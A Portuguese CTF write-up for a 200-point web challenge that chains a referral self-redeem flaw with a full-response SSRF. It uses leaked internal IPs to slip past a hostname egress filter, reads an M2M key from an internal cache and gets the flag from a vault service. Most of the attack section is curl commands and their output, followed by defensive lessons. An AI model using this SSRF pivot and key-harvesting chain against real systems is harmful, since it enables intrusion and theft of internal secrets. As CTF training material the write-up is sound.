# MyNotes / StickerBoard — Writeup

- **Evento:** Main CTF Ekoparty BA 2026 (Hack in Cariri)
- **Categoria:** WEB · **Pontos:** 200 · **Bugs:** 2
- **Alvo:** https://<HOST>/
- **Flag:** `HIK_SSRF_CHALLS_ARE_COOL_aea1b1f194efa878429d678d0fe22ad7`

## TL;DR

App de notas que **busca server-side** as URLs coladas numa nota ("scan de malware") e devolve o
corpo da resposta em `response_preview` → **SSRF full-response**. O scan custa crédito; o crédito
se farma com **self-redeem** do próprio código de referral. Com crédito infinito, usa-se o SSRF
pra enumerar microsserviços internos (IPs vazados nos erros de egress), ler a chave M2M de um
cache e autenticar num vault que entrega a flag.

## Recon

Página de login (StickerBoard) + board de notas. Dois sistemas no HTML/JS inline:

- `POST /notes` manda `{title, content, color}`; URLs no `content` são escaneadas e cada scan
  retorna `{url, status_code, is_safe, response_preview}`.
- Referral: `GET /referrals/me`, `POST /referrals/redeem {code}`. Scan custa 1 crédito, começa 0.

Comentário de infra plantado no `<head>`:

```html
<!-- infra: the URL scanner delegates to the internal microservice "internal-swagger"
     (backend network, off the internet). -->
```

## Bug 1 — Self-redeem (gate de crédito)

O referral credita "ambos os lados" quando alguém resgata seu código, e **não valida que o código
é o seu próprio**. Resgatar o próprio código credita você duas vezes, repetível:

```bash
R=$(curl -s -X POST $B/auth/register -H 'Content-Type: application/json' \
      -d '{"username":"x","email":"x@x.com","password":"p"}')
TOK=...; CODE=...   # do JSON de retorno
curl -s -X POST $B/referrals/redeem -H "Authorization: Bearer $TOK" \
     -H 'Content-Type: application/json' -d "{\"code\":\"$CODE\"}"
# -> {"redeemed":true,"reward":5,"scan_quota":10,...}  (repetir pra acumular)
```

## Bug 2 — SSRF full-response + bypass de egress por IP vazado

`http://internal-swagger/` é bloqueado, **mas o erro vaza o IP resolvido**:

```
[EGRESS-POLICY] Internal host blocked by egress policy: internal-swagger -> 10.0.27.11
```

A policy filtra por **hostname**; o **IP:porta** direto passa:

```bash
# helper: repõe crédito + posta nota com a URL interna, lê response_preview
scan(){ curl -s -X POST $B/referrals/redeem ... -d "{\"code\":\"$CODE\"}" >/dev/null
        curl -s -X POST $B/notes -H "Authorization: Bearer $TOK" \
          -d "{\"title\":\"t\",\"content\":\"x $1\",\"color\":\"amarelo\"}"; }

scan http://10.0.27.11:8080/openapi.json   # OpenAPI da API interna (porta 8080!)
```

### Pivot pela API interna

OpenAPI lista `servers`: `cache-service:8080`, `vault-service:8080` (requer M2M). Endpoints:
`GET /cache/keys`, `GET /cache`, `GET /get-token`. Resolve cada host pelo mesmo truque de IP:

```bash
scan http://10.0.27.2:8080/cache/keys
# {"keys":["app:config:version",...]}  (namespace secret:* NÃO listado)

scan http://10.0.27.5:8080/
# hint: M2M via X-API-Key header OU api_key query param; credencial em secret:vault:m2m

scan http://10.0.27.2:8080/cache?key=secret:vault:m2m
# {"value":"sk-vault-lp2026-m2m-7f3b9d2c"}   <- namespace oculto, legível direto

scan "http://10.0.27.5:8080/get-token?api_key=sk-vault-lp2026-m2m-7f3b9d2c"
# {"flag":"HIK_SSRF_CHALLS_ARE_COOL_aea1b1f194efa878429d678d0fe22ad7", ...}
```

(Via SSRF só se controla a URL → usa `?api_key=` em vez do header `X-API-Key`.)

## Lições

- Erro de egress **nunca** deve vazar o IP resolvido do host bloqueado — é o bypass inteiro.
- Esconder chave do listing (`secret:*`) ≠ proteger: `GET /cache?key=secret:...` lê direto.
- Referral/credit sem checar self-redeem = crédito infinito.

## Padrão no Arsenal

`Arsenal/WEB/ssrf-internal-microservice-ip-leak.md`
